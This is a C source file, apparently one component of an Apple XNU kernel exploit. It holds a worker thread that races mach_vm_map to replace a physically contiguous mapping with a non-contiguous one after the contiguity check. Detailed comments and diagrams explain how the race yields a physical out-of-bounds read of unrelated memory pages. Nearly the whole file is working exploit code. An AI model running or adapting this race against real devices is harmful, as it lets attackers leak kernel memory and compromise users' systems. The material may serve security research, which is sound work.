#include "free_thread.h"

void* free_thread_worker(void* arg) {
    free_thread_shared_t* shared = arg;

    while (atomic_load_explicit(&shared->free_thread_start, memory_order_seq_cst) == 0);

    // physically contiguous object address
    mach_vm_address_t free_target = atomic_load_explicit(&shared->free_target_sync, memory_order_seq_cst);
    // physically contiguous object size
    mach_vm_size_t free_target_size = atomic_load_explicit(&shared->free_target_size_sync, memory_order_seq_cst);

    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) == 0);

    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) != 0) {
        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 0);

        // target_object_sync here on first physical_oob_read_mo call is memory_object from mem entry
        mach_port_t target_object = (mach_port_t)atomic_load_explicit(&shared->target_object_sync, memory_order_seq_cst);
        // offset we're at in the search mapping on first physical_oob_read_mo call
        mach_vm_offset_t target_object_offset = atomic_load_explicit(&shared->target_object_offset_sync, memory_order_seq_cst);
        mach_vm_address_t target_addr = free_target;
        // target object here is memory entry at offset, size is 2 pages
        // we first allocate mapping (M0) where 2 pages are guaranteed to be physically contiguous (under PurpleGfxMem)
        // then, in the race window, we swap to an entirely different mapping (M1). M1 is not guaranteed to be physically contiguous.
        // the copy still follows the assumption of M0 and copies 2 physical pages in sequence, so the second page it
        // copies from may not belong to M1, and come from contiguous unrelated memory.
        //
        //            Start: (M0) contiguous
        //
        //            +-------------------+-------------------+
        // VA         |      page 1       |      page 2       |
        //            +---------|---------+---------|---------+
        //                      |                   |
        //                      v                   v
        //            +-------------------+-------------------+
        // PhysMem    |      P100         |       P101        |
        //            +-------------------+-------------------+
        //                     ^                    ^
        //                     |____________________|
        //                           contiguous
        //
        //
        //            Remap to non-contiguous mapping (M1) AFTER vm_map_get_upl call checked M0 is contiguous
        //            Possible wrong page will be copied
        //
        //            +-------------------+-------------------+
        // VA         |      page 1       |      page 2       |
        //            +---------|---------+---------|---------+
        //                      |                   |-----------------------|
        //                      v                                           v
        //            +-----------+-----------+-----------+-----------+-----------+
        // PhysMem    |    P420   |   P421    |    ...    |    P999   |   P1000   |
        //            +-----------+-----------+-----------+-----------+-----------+
        //                 ^           ^                                     ^
        //                 |           |                                     |
        //            M1 page 1   NOT M1 PAGE 2                       REAL M1 page 2
        //                        THIS IS THE PAGE
        //                        COPIED
        //                        INSTEAD
        //                        OF REAL M1 PAGE 2
        //                        DUE TO BUG

        // here we're mapping OVER the physically contiguous object (VM_FLAGS_FIXED), overwritting with the mapping's current offset
        // which is not guaranteed to be physically contiguous (VM_FLAGS_OVERWRITE)
        kern_return_t kr = mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT,
                                       VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            // LOG_DEBUG("free_thread: target_object_offset: %#llx, free_target_size: %#llx", target_object_offset, free_target_size);
            LOG_ERR("free_thread: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        atomic_store_explicit(&shared->race_sync, 0, memory_order_seq_cst);
    }

    return NULL;
}
